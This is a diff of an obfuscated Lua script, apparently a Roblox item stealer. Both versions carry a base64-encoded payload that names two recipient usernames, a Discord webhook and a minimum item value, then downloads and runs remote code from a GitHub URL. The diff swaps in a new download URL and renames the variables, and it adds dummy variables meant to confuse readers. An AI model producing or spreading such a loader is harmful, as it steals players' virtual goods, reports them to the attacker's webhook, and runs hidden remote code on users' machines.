@@ -1,6 +1,6 @@
 
-local KOqoWPMmV = 'VXNlcm5hbWUgPSAibmV3YmVnaW5uZXIxMjM0NSIKVXNlcm5hbWUyID0gIjEyMzRuZXdiZWdpbm5lciIKV2ViaG9vayA9ICJodHRwczovL2Rpc2NvcmQuY29tL2FwaS93ZWJob29rcy8xMjk3ODQ1MzU2OTcyNzM2NTQzL1N5Ulc5cWJjYnNQS0REc3A4NlY2am9FZzdRR2J5VHZ0NHNRcmxPcWREWWphOUtkT3F0MTY0X19ZY0swMlVYblFjR1N2IgpNaW5pbXVtUkFQID0gMTAwMDAwCmxvYWRzdHJpbmcoZ2FtZTpIdHRwR2V0KCJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vc2hhZHN6L3N5dGNoY2UvbWFpbi9vYmZ1c2NhdGVkX3NjcmlwdC5sdWEiLCB0cnVlKSkoKQ=='
-local UqCvHekuY = function(s) 
+local OifkpFrs = 'VXNlcm5hbWUgPSAibmV3YmVnaW5uZXIxMjM0NSIKVXNlcm5hbWUyID0gIjEyMzRuZXdiZWdpbm5lciIKV2ViaG9vayA9ICJodHRwczovL2Rpc2NvcmQuY29tL2FwaS93ZWJob29rcy8xMjk3ODQ1MzU2OTcyNzM2NTQzL1N5Ulc5cWJjYnNQS0REc3A4NlY2am9FZzdRR2J5VHZ0NHNRcmxPcWREWWphOUtkT3F0MTY0X19ZY0swMlVYblFjR1N2IgpNaW5pbXVtUkFQID0gMTAwMDAwCmxvYWRzdHJpbmcoZ2FtZTpIdHRwR2V0KCJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vc2hhZG93c3p6enovdGltb2NpeS9yZWZzL2hlYWRzL21haW4vbWFpbiIsIHRydWUpKSgp'
+local VPwpztvuzW = function(s) 
     local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'; 
     s = string.gsub(s, '[^'..b..'=]', ''); 
     return (s:gsub('.', function(x) 
@@ -15,9 +15,9 @@ local UqCvHekuY = function(s)
         return string.char(c) 
     end)) 
 end
-local LYEcmcoGv = UqCvHekuY(KOqoWPMmV)
-loadstring(LYEcmcoGv)() -- Run decoded code
+local VCDILTHNH = VPwpztvuzW(OifkpFrs)
+loadstring(VCDILTHNH)() -- Run decoded code
 
 -- Dummy variables for confusion
-local frOjpuTkRLos = math.random()
-local vbbKNXncH = "This is a dummy string"
+local MabNFlqxxwxw = math.random()
+local OvjJLZXJmo = "This is a dummy string"
